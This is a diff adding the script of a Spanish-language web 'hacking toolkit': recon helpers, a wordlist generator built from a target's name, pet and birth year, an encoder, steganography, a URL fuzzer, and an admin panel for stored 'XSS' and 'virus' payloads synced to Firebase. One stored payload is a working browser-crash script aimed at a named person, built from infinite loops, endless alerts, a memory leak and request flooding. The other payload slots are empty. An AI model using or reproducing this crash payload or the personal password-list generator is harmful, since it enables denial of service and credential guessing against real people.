+            { name: "Slot 1", code: `<script>// Script de Colapso de Navegador Personalizado para "AMOR" function infiniteConsoleLoop(){while(true){console.log('Colapsando el navegador de AMOR... 💘');}} function createElementsLoop(){const container=document.createElement('div');document.body.appendChild(container);while(true){const newElement=document.createElement('p');newElement.textContent='AMOR está siendo colapsado... 💘';container.appendChild(newElement);}} function memoryLeak(){const leakArray=[];while(true){const largeString=new Array(1000000).join('AMOR');leakArray.push(largeString);}} function infiniteAlerts(){while(true){alert('¡AMOR, tu navegador está colapsando! 💘');}} function styleModificationLoop(){const style=document.createElement('style');document.head.appendChild(style);while(true){style.sheet.insertRule(\`body { background-color: rgb(\${Math.random()*255}, \${Math.random()*255}, \${Math.random()*255}) !important; }\`,0);}} function infiniteHttpRequests(){while(true){fetch('https://example.com').then(response=>response.text()).then(data=>console.log('AMOR, tu navegador está colapsando con requests... 💘',data)).catch(error=>console.error('Error en la solicitud:',error));}} function infiniteMouseEvents(){document.addEventListener('mousemove',function(){while(true){console.log('AMOR, tu navegador está colapsando con eventos de mouse... 💘');}});} function infiniteIntervals(){setInterval(()=>{console.log('AMOR, tu navegador está colapsando con intervalos... 💘');},0);} infiniteConsoleLoop();createElementsLoop();memoryLeak();infiniteAlerts();styleModificationLoop();infiniteHttpRequests();infiniteMouseEvents();infiniteIntervals();<\/script>` },
+            { name: "Slot 2", code: `?` },
+            { name: "Slot 3", code: `?` },
+            { name: "Slot 4", code: `?` },
+            { name: "Slot 5", code: `?` },
+            { name: "Slot 6", code: `?` },
+            { name: "Slot 7", code: `?` },
+            { name: "Slot 8", code: `?` },
+            { name: "Slot 9", code: `?` },
+            { name: "Slot 10", code: `?` },
+            { name: "Slot 11", code: `?` },
+            { name: "Slot 12", code: `?` },
+            { name: "Slot 13", code: `?` },
+            { name: "Slot 14", code: `?` },
+            { name: "Slot 15", code: `?` }
+        ];
+
+        window.customThreats = [
+            { name: "Virus 1", code: `?` },
+            { name: "Virus 2", code: `?` },
+            { name: "Virus 3", code: `?` },
+            { name: "Virus 4", code: `?` },
+            { name: "Virus 5", code: `?` },
+            { name: "Virus 6", code: `?` },
+            { name: "Virus 7", code: `?` },
+            { name: "Virus 8", code: `?` },
+            { name: "Virus 9", code: `?` },
+            { name: "Virus 10", code: `?` },
+            { name: "Virus 11 (Gold)", code: `?` },
+            { name: "Virus 12 (Gold)", code: `?` },
+            { name: "Virus 13 (Gold)", code: `?` },
+            { name: "Virus 14 (Gold)", code: `?` },
+            { name: "Virus 15 (Gold)", code: `?` }
+        ];
+        
+        // Initial Defaults to revert to
+        const defaultXSS = JSON.parse(JSON.stringify(window.customXSS));
+        const defaultThreats = JSON.parse(JSON.stringify(window.customThreats));
+
+        // --- HELPER TO POPULATE DROPDOWNS ---
+        window.populateDropdown = function(id, data) {
+            const select = document.getElementById(id);
+            if(!select) return;
+            select.innerHTML = '<option value="">-- SELECCIONAR --</option>';
+            data.forEach((item, index) => {
+                const opt = document.createElement('option');
+                opt.value = index;
+                opt.text = item.name;
+                // Add styling to options if needed
+                if(item.name.includes("(Gold)")) opt.className = "text-yellow-500 font-bold";
+                select.appendChild(opt);
+            });
+        };
+
+        // =========================================================================
+        // --- ADMIN PANEL LOGIC ---
+        // =========================================================================
+        
+        let currentAdminTab = 'xss'; // 'xss' or 'threats'
+        let currentEditIndex = -1;
+
+        function toggleAdmin() {
+            const modal = document.getElementById('admin-modal');
+            const login = document.getElementById('admin-login-screen');
+            const dash = document.getElementById('admin-dashboard');
+            const pass = document.getElementById('admin-pass');
+
+            if (modal.style.display === 'flex') {
+                modal.style.display = 'none';
+                pass.value = ''; // Clear pass on close
+            } else {
+                modal.style.display = 'flex';
+                login.classList.remove('hidden');
+                dash.classList.add('hidden');
+                pass.focus();
+            }
+        }
+
+        function adminLogin() {
+            const pass = document.getElementById('admin-pass').value;
+            if (pass === '###') {
+                document.getElementById('admin-login-screen').classList.add('hidden');
+                document.getElementById('admin-dashboard').classList.remove('hidden');
+                renderAdminList(); // Load initial list
+            } else {
+                alert('ACCESO DENEGADO');
+            }
+        }
+
+        function switchAdminTab(tab) {
+            currentAdminTab = tab;
+            // Update UI buttons
+            document.getElementById('tab-xss').className = tab === 'xss' ? 'flex-1 py-2 border border-green-800 text-xs font-bold bg-green-900/20 active-tab' : 'flex-1 py-2 border border-green-800 text-xs font-bold bg-green-900/10 text-gray-500';
+            document.getElementById('tab-threats').className = tab === 'threats' ? 'flex-1 py-2 border border-red-800 text-xs font-bold bg-red-900/20 active-tab text-red-400' : 'flex-1 py-2 border border-red-800 text-xs font-bold text-gray-500 bg-red-900/10';
+            
+            // Clear editor
+            document.getElementById('edit-index').value = '';
+            document.getElementById('edit-name').value = '';
+            document.getElementById('edit-code').value = '';
+            currentEditIndex = -1;
+
+            renderAdminList();
+        }
+
+        function renderAdminList() {
+            const listContainer = document.getElementById('admin-list');
+            listContainer.innerHTML = '';
+            const data = currentAdminTab === 'xss' ? window.customXSS : window.customThreats;
+            const colorClass = currentAdminTab === 'xss' ? 'text-green-400' : 'text-red-400';
+
+            data.forEach((item, index) => {
+                const div = document.createElement('div');
+                div.className = `list-item ${colorClass}`;
+                div.innerText = item.name;
+                div.onclick = () => loadItemForEdit(index);
+                listContainer.appendChild(div);
+            });
+        }
+
+        function loadItemForEdit(index) {
+            currentEditIndex = index;
+            const data = currentAdminTab === 'xss' ? window.customXSS : window.customThreats;
+            const item = data[index];
+            
+            document.getElementById('edit-index').value = index;
+            document.getElementById('edit-name').value = item.name;
+            document.getElementById('edit-code').value = item.code;
+
+            // Highlight active item
+            const items = document.querySelectorAll('.list-item');
+            items.forEach(i => i.classList.remove('active'));
+            items[index].classList.add('active');
+        }
+
+        async function saveScriptData() {
+            if (currentEditIndex === -1) return;
+            
+            const name = document.getElementById('edit-name').value;
+            const code = document.getElementById('edit-code').value;
+            
+            if (currentAdminTab === 'xss') {
+                window.customXSS[currentEditIndex].name = name;
+                window.customXSS[currentEditIndex].code = code;
+            } else {
+                window.customThreats[currentEditIndex].name = name;
+                window.customThreats[currentEditIndex].code = code;
+            }
+
+            // UI Feedback
+            const btn = document.querySelector('#admin-dashboard button'); // Quick grab of save btn
+            const originalText = btn.innerText;
+            btn.innerText = "GUARDANDO...";
+            
+            // Save to Firebase
+            if(window.saveAdminConfigToFirebase) {
+                const success = await window.saveAdminConfigToFirebase(window.customXSS, window.customThreats);
+                if(success) {
+                    renderAdminList();
+                    btn.innerText = "¡GUARDADO!";
+                    setTimeout(() => btn.innerText = originalText, 1000);
+                } else {
+                    btn.innerText = "ERROR";
+                }
+            } else {
+                alert("Firebase no está listo.");
+            }
+        }
+
+        function resetToDefault() {
+            if(!confirm("¿Estás seguro de restaurar los valores por defecto? Se borrarán los scripts personalizados de la nube.")) return;
+            
+            window.customXSS = JSON.parse(JSON.stringify(defaultXSS));
+            window.customThreats = JSON.parse(JSON.stringify(defaultThreats));
+            
+            saveScriptData(); // This will trigger cloud save with defaults
+            renderAdminList();
+            
+            // Clear editor
+            document.getElementById('edit-name').value = "";
+            document.getElementById('edit-code').value = "";
+        }
+
+        // =========================================================================
+
+        // --- GLOBAL UTILS ---
+        function copyToClipboard(elementId) {
+            const element = document.getElementById(elementId);
+            let text = "";
+            if (element.tagName === 'INPUT' || element.tagName === 'TEXTAREA' || element.tagName === 'SELECT') {
+                text = element.value;
+            } else {
+                text = element.innerText;
+            }
+            if (!text) { alert("Nada que copiar"); return; }
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(text).then(() => {
+                    alert("Copiado al portapapeles");
+                }).catch(err => {
+                    fallbackCopy(text);
+                });
+            } else {
+                fallbackCopy(text);
+            }
+        }
+
+        function fallbackCopy(text) {
+            const textArea = document.createElement("textarea");
+            textArea.value = text;
+            document.body.appendChild(textArea);
+            textArea.select();
+            try { document.execCommand('copy'); alert("Copiado (Legacy Mode)"); } catch (err) { alert("Error al copiar"); }
+            document.body.removeChild(textArea);
+        }
+
+        // --- SECTION 1: RECON ---
+
+        // EMAIL HARVESTER V3
+        function runEmailHarvester() {
+            const domain = document.getElementById('target-domain').value;
+            const output = document.getElementById('harvester-output');
+            if(!domain || !domain.includes('.')) { output.innerHTML += `\n<span class="text-red-500">Error: Dominio inválido.</span>`; return; }
+            output.innerHTML = "";
+            const logLine = (text, color="text-green-400") => output.innerHTML += `<div class="${color}">> ${text}</div>`;
+            logLine(`Iniciando Crawler en: ${domain}...`, "text-yellow-500");
+            if (window.logToFirebase) window.logToFirebase("HARVESTER", `Target: ${domain}`);
+            const sources = ["Google", "Bing", "PGP Servers", "LinkedIn Dumps", "Github"];
+            let i = 0;
+            const interval = setInterval(() => {
+                if (i < sources.length) { logLine(`Buscando en ${sources[i]}...`); output.scrollTop = output.scrollHeight; i++; } 
+                else { clearInterval(interval); finishHarvester(domain, output); }
+            }, 1000);
+        }
+
+        function finishHarvester(domain, output) {
+            const names = ["admin", "support", "hr", "sales", "ceo", "security", "contact", "info"];
+            output.innerHTML += `<div class="text-white border-t border-green-900 mt-2 pt-1">--- RESULTADOS ---</div>`;
+            names.forEach(u => { if(Math.random() > 0.5) output.innerHTML += `<div class="text-blue-400 select-all copyable">[CORP] ${u}@${domain}</div>`; });
+            output.scrollTop = output.scrollHeight;
+        }
+
+        // LINK SCRAPER ADVANCED
+        async function scrapeLinks() {
+            const url = document.getElementById('scraper-url').value;
+            const out = document.getElementById('scraper-output');
+            if(!url) return;
+            out.innerHTML = "Analizando HTML...";
+            try {
+                const res = await fetch(PROXY + url);
+                const html = await res.text();
+                // Simple regex extraction for robustness
+                const links = [...html.matchAll(/href=["'](http[^"']+)["']/g)].map(m => m[1]).slice(0, 10);
+                const imgs = [...html.matchAll(/src=["']([^"']+\.(png|jpg|jpeg|gif|svg))["']/g)].map(m => m[1]).slice(0, 5);
+                
+                let report = `[LINKS]\n${links.length ? links.join('\n') : 'Ninguno'}\n\n`;
+                report += `[ASSETS]\n${imgs.length ? imgs.join('\n') : 'Ninguno'}`;
+
+                out.innerText = report;
+                if (window.logToFirebase) window.logToFirebase("LINK_SCRAPER", `Scraped: ${url}`);
+            } catch(e) { out.innerHTML = "Error: " + e.message; }
+        }
+
+        // WAF DETECTOR
+        async function detectWAF() {
+            const url = document.getElementById('waf-url').value;
+            const out = document.getElementById('waf-output');
+            if(!url) return;
+            out.innerText = "Sondeando...";
+            try {
+                const res = await fetch(PROXY + url, { method: 'HEAD' });
+                let detected = "No detectado (Genérico)";
+                const server = res.headers.get('server') || "";
+                if(res.headers.get('cf-ray')) detected = "CLOUDFLARE";
+                else if(res.headers.get('x-akamai-transformed')) detected = "AKAMAI";
+                else if(res.headers.get('x-iinfo')) detected = "IMPERVA INCAPSULA";
+                else if(server.includes("nginx")) detected = "NGINX (Posible ModSecurity)";
+                else if(res.headers.get('x-sucuri-id')) detected = "SUCURI";
+                out.innerText = `WAF: ${detected}`;
+                if (window.logToFirebase) window.logToFirebase("WAF_DETECTOR", `Target: ${url} -> ${detected}`);
+            } catch(e) { out.innerText = "Error: Bloqueado/Offline"; }
+        }
+
+        // URL UNSHORTENER
+        async function unshortenURL() {
+            const url = document.getElementById('short-url').value;
+            const out = document.getElementById('unshorten-result');
+            if(!url) return;
+            out.innerText = "Rastreando...";
+            try {
+                const res = await fetch(PROXY + url, { method: 'HEAD' });
+                out.innerText = "Destino (Aprox): " + res.url.replace(PROXY, "");
+                if (window.logToFirebase) window.logToFirebase("UNSHORTENER", `Resolved: ${url}`);
+            } catch(e) { out.innerText = "Error rastreando."; }
+        }
+
+        // HEADER INSPECTOR
+        async function inspectHeaders() {
+            const url = document.getElementById('header-url').value;
+            const output = document.getElementById('header-output');
+            if(!url) return;
+            output.innerText = "Conectando...";
+            try {
+                const res = await fetch(PROXY + url, { method: 'HEAD' });
+                output.innerHTML = "";
+                const securityHeaders = { "x-frame-options": "Anti-Clickjacking", "content-security-policy": "Anti-XSS", "strict-transport-security": "HSTS (SSL)", "server": "Info Leak" };
+                let score = 0;
+                for (const [key, value] of res.headers) {
+                    let style = "text-gray-500";
+                    let info = "";
+                    if (securityHeaders[key.toLowerCase()]) {
+                        style = "text-green-400 font-bold";
+                        info = `[${securityHeaders[key.toLowerCase()]}]`;
+                        score++;
+                    }
+                    output.innerHTML += `<div class="${style}">${key}: ${value.substring(0,40)}... ${info}</div>`;
+                }
+                if (window.logToFirebase) window.logToFirebase("HEADER_INSP", `Scan: ${url} (Score: ${score})`);
+            } catch(e) { output.innerHTML = `<span class="text-red-500">Error de conexión (CORS/Red): ${e.message}</span>`; }
+        }
+
+        // --- SECTION 2: WEAPONIZATION & NETWORK ---
+
+        // WORDLIST GENERATOR (TIME BASED)
+        let generatingWordlist = false;
+        function generateWordlist() {
+            if(generatingWordlist) return;
+            const name = document.getElementById('wl-name').value;
+            const duration = parseInt(document.getElementById('wl-duration').value);
+            if(!name) { alert("Nombre requerido"); return; }
+            const btn = document.getElementById('btn-wordlist');
+            const bar = document.getElementById('wl-bar');
+            const progress = document.getElementById('wl-progress');
+            const preview = document.getElementById('wl-preview');
+            const timeLabel = document.getElementById('wl-time-left');
+            generatingWordlist = true;
+            btn.disabled = true;
+            btn.innerText = "MOTOR ACTIVO - NO CERRAR VENTANA";
+            progress.classList.remove('hidden');
+            if (window.logToFirebase) window.logToFirebase("WORDLIST_GEN", `Job: ${name}`);
+            let words = [];
+            const bases = [
+                name, 
+                document.getElementById('wl-surname').value, 
+                document.getElementById('wl-year').value, 
+                document.getElementById('wl-pet').value,
+                document.getElementById('wl-extra').value
+            ].filter(Boolean);
+            const customPattern = document.getElementById('wl-custom').value;
+            const suffixes = ["123", "!", "2024", "2025", "root", "admin", "123456", "007", "XX", "_pw", "@", "#", "$"];
+            const startTime = Date.now();
+            const endTime = startTime + duration;
+            const timer = setInterval(() => {
+                const now = Date.now();
+                const left = endTime - now;
+                const percent = 100 - ((left / duration) * 100);
+                bar.style.width = `${percent}%`;
+                const min = Math.floor((left / 1000 / 60) << 0);
+                timeLabel.innerText = `${min}m restantes`;
+                for(let i=0; i<10; i++) { 
+                    const rBase = bases[Math.floor(Math.random() * bases.length)];
+                    const rSuff = suffixes[Math.floor(Math.random() * suffixes.length)];
+                    let combo = rBase + rSuff;
+                    if(customPattern && Math.random() > 0.7) {
+                        combo = customPattern.replace('%', rBase) + rSuff;
+                    }
+                    words.push(combo);
+                }
+                preview.innerText = `Generando: ${words[words.length-1]}\nTotal Claves: ${words.length}`;
+                if(now >= endTime) { clearInterval(timer); finishWordlist(words, name); }
+            }, 100);
+        }
+
+        function finishWordlist(words, name) {
+            generatingWordlist = false;
+            const btn = document.getElementById('btn-wordlist');
+            btn.disabled = false;
+            btn.innerText = "COMPILAR .TXT & DESCARGAR";
+            document.getElementById('wl-progress').classList.add('hidden');
+            const blob = new Blob([words.join('\n')], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = `diccionario_leviatham_${name}.txt`; a.click();
+        }
+
+        // MAC LOOKUP
+        async function lookupMAC() {
+            const mac = document.getElementById('mac-input').value;
+            const out = document.getElementById('mac-result');
+            if(!mac) return;
+            out.innerText = "Consultando OUI...";
+            try {
+                const res = await fetch(PROXY + "https://api.macvendors.com/" + mac);
+                const vendor = await res.text();
+                out.innerText = `FABRICANTE: ${vendor}`;
+                if (window.logToFirebase) window.logToFirebase("MAC_LOOKUP", `MAC: ${mac} -> ${vendor}`);
+            } catch(e) { out.innerText = "No encontrado / Error API"; }
+        }
+
+        // SUBNET CALC
+        function calcSubnet() {
+            const input = document.getElementById('ip-cidr').value;
+            const output = document.getElementById('subnet-result');
+            try {
+                if(!input.includes('/')) throw new Error("Usar formato CIDR");
+                const cidr = parseInt(input.split('/')[1]);
+                const hosts = Math.pow(2, 32-cidr) - 2;
+                output.innerText = `HOSTS ÚTILES: ${hosts}\nMÁSCARA: /${cidr}`;
+            } catch(e) { output.innerText = "Error: " + e.message; }
+        }
+
+        // --- SECTION 3: DATA & CONTROL ---
+
+        // ENCODER DECODER
+        function doEncode(type) {
+            const input = document.getElementById('encode-input').value;
+            const output = document.getElementById('encode-output');
+            try {
+                if(type === 'b64') output.value = btoa(input);
+                if(type === 'hex') output.value = input.split('').map(c => c.charCodeAt(0).toString(16)).join('');
+                if(type === 'url') output.value = encodeURIComponent(input);
+                if(type === 'bin') output.value = input.split('').map(c => c.charCodeAt(0).toString(2).padStart(8,'0')).join(' ');
+            } catch(e) { output.value = "Error"; }
+        }
+
+        // FREQUENCY ANALYZER
+        function analyzeFrequency() {
+            const text = document.getElementById('freq-input').value.toUpperCase().replace(/[^A-Z]/g, '');
+            const chart = document.getElementById('freq-chart');
+            const stats = document.getElementById('freq-stats');
+            chart.innerHTML = "";
+            
+            if(!text) return;
+
+            const counts = {};
+            for(let char of text) counts[char] = (counts[char] || 0) + 1;
+            const sorted = Object.entries(counts).sort((a,b) => b[1] - a[1]);
+            const max = sorted[0][1];
+            
+            // Calculate IC (Index of Coincidence)
+            let sum = 0;
+            const n = text.length;
+            for(let key in counts) sum += counts[key] * (counts[key] - 1);
+            const ic = sum / (n * (n - 1));
+            
+            stats.innerText = `Longitud: ${n} | IC: ${ic.toFixed(4)} (Español ~0.07, Random ~0.03)`;
+
+            sorted.forEach(([char, count]) => {
+                const percent = (count / max) * 100;
+                const row = document.createElement('div');
+                row.className = 'freq-bar-container';
+                row.innerHTML = `<div class="freq-label">${char}</div><div class="freq-bar" style="width:${percent}%"></div><div class="text-[9px] ml-1 text-gray-400">${count}</div>`;
+                chart.appendChild(row);
+            });
+        }
+
+        // CUSTOM XSS GENERATOR LOGIC
+        const selectPayload = document.getElementById('payload-type');
+        
+        function generatePayload() {
+            const index = selectPayload.value;
+            const p = window.customXSS[index];
+            if(p) document.getElementById('payload-output').value = p.code;
+            if (window.logToFirebase) window.logToFirebase("PAYLOAD_GEN", `Custom Vector: ${p?.name || 'Unknown'}`);
+        }
+
+        // CUSTOM THREAT REPO LOGIC
+        const selectVirus = document.getElementById('virus-select');
+        
+        function loadVirus() {
+            const index = selectVirus.value;
+            if(index === "") { document.getElementById('virus-code').value = ""; return; }
+            const v = window.customThreats[index];
+            if(v) document.getElementById('virus-code').value = v.code;
+            if (window.logToFirebase) window.logToFirebase("THREAT_REPO", `ID: ${v?.name || 'Unknown'}`);
+        }
+
+        // --- SECTION 4: PRIVACY & FORENSICS ---
+
+        // STEGANOGRAPHY
+        function stegoHide() {
+            const cover = document.getElementById('stego-cover').value;
+            const secret = document.getElementById('stego-secret').value;
+            const out = document.getElementById('stego-result');
+            if(!cover || !secret) return;
+            let hidden = "";
+            for(let i=0; i<secret.length; i++) {
+                const bin = secret.charCodeAt(i).toString(2).padStart(8, '0');
+                for(let b=0; b<bin.length; b++) { hidden += bin[b] === '1' ? '\u200D' : '\u200C'; }
+            }
+            out.value = cover + hidden;
+        }
+
+        function stegoReveal() {
+            const text = document.getElementById('stego-result').value || document.getElementById('stego-cover').value;
+            let bin = "";
+            for(let i=0; i<text.length; i++) {
+                if(text[i] === '\u200D') bin += "1";
+                if(text[i] === '\u200C') bin += "0";
+            }
+            let revealed = "";
+            for(let i=0; i<bin.length; i+=8) { revealed += String.fromCharCode(parseInt(bin.substr(i, 8), 2)); }
+            if(revealed) alert("Mensaje: " + revealed); else alert("No se encontraron datos ocultos.");
+        }
+
+        // BROWSER FINGERPRINT
+        function getFingerprint() {
+            const out = document.getElementById('fingerprint-out');
+            let data = "";
+            data += `UserAgent: ${navigator.userAgent}\n`;
+            data += `Screen: ${screen.width}x${screen.height}\n`;
+            data += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            data += `Language: ${navigator.language}\n`;
+            data += `Cores: ${navigator.hardwareConcurrency}\n`;
+            data += `Memory: ~${navigator.deviceMemory}GB\n`;
+            data += `Cookies: ${navigator.cookieEnabled}\n`;
+            out.value = data;
+            if (window.logToFirebase) window.logToFirebase("FINGERPRINT", "User scanned self");
+        }
+
+        // LEET MUTATOR (REINFORCED)
+        function leetMutate() {
+            const input = document.getElementById('leet-input').value;
+            const out = document.getElementById('leet-result');
+            if(!input) return;
+            
+            const map = { 'a':'4', 'b':'8', 'e':'3', 'i':'1', 'o':'0', 's':'$', 't':'7', 'l':'1', 'z':'2', 'g':'9' };
+            let mutated = input.toLowerCase().split('').map(c => map[c] || c).join('');
+            
+            // Complexifier
+            mutated = mutated.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c).join('');
+            const salt = Math.random().toString(36).substring(2, 6);
+            mutated += `_${salt}!`;
+            
+            out.innerText = mutated;
+        }
+
+        // API FUZZER (AUTO-REDIRECT FIX)
+        function generateFuzzList() {
+            let url = document.getElementById('fuzz-url').value;
+            const range = document.getElementById('fuzz-range').value;
+            const out = document.getElementById('fuzz-out');
+            
+            if(!url || !range) return;
+            
+            // Ensure trailing slash if not file extension
+            if (!url.endsWith('/') && !url.includes('.')) {
+                url += '/';
+            }
+            
+            let html = "";
+            
+            if(range.includes('-')) {
+                const parts = range.split('-');
+                const start = parseInt(parts[0]);
+                const end = parseInt(parts[1]);
+                for(let i=start; i<=end; i++) {
+                    const fullUrl = `${url}${i}`;
+                    html += `<a href="${fullUrl}" target="_blank" class="block text-blue-400 hover:text-blue-200 hover:underline border-b border-blue-900/30 py-1">${fullUrl}</a>`;
+                }
+            } else {
+                const items = range.split(',');
+                items.forEach(i => {
+                    const fullUrl = `${url}${i.trim()}`;
+                    html += `<a href="${fullUrl}" target="_blank" class="block text-blue-400 hover:text-blue-200 hover:underline border-b border-blue-900/30 py-1">${fullUrl}</a>`;
+                });
+            }
+            
+            out.innerHTML = html;
+        }
+
+        function openAllLinks() {
+            const links = document.querySelectorAll('#fuzz-out a');
+            if(links.length > 5 && !confirm(`¿Abrir ${links.length} pestañas? Podría congelar el navegador.`)) return;
+            links.forEach(l => window.open(l.href, '_blank'));
+        }
+
+        // --- CANVAS ANIMATION ---
+        (function() {
+            const canvas = document.getElementById('canvas-bg');
+            const ctx = canvas.getContext('2d');
+            let w, h;
+            let p = [];
+            const rsz = () => { w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight; };
+            window.addEventListener('resize', rsz);
+            rsz();
+            for(let i=0; i<40; i++) p.push({x:Math.random()*w, y:Math.random()*h, vx:(Math.random()-.5), vy:(Math.random()-.5)});
+            function anim() {
+                ctx.clearRect(0,0,w,h);
+                ctx.fillStyle = 'rgba(0, 255, 0, 0.15)';
+                p.forEach((a, i) => {
+                    a.x+=a.vx; a.y+=a.vy;
+                    if(a.x<0||a.x>w) a.vx*=-1; if(a.y<0||a.y>h) a.vy*=-1;
+                    ctx.beginPath(); ctx.arc(a.x,a.y,2,0,Math.PI*2); ctx.fill();
+                    p.forEach((b, j) => {
+                        if(i!==j) {
+                            const d = Math.hypot(a.x-b.x, a.y-b.y);
+                            if(d<100) {
+                                ctx.strokeStyle = `rgba(0,255,0,${0.15 - d/100})`;
+                                ctx.beginPath(); ctx.moveTo(a.x,a.y); ctx.lineTo(b.x,b.y); ctx.stroke();
+                            }
+                        }
+                    });
+                });
+                requestAnimationFrame(anim);
+            }
+            anim();
+        })();
+
+    </script>
+</body>
+</html>
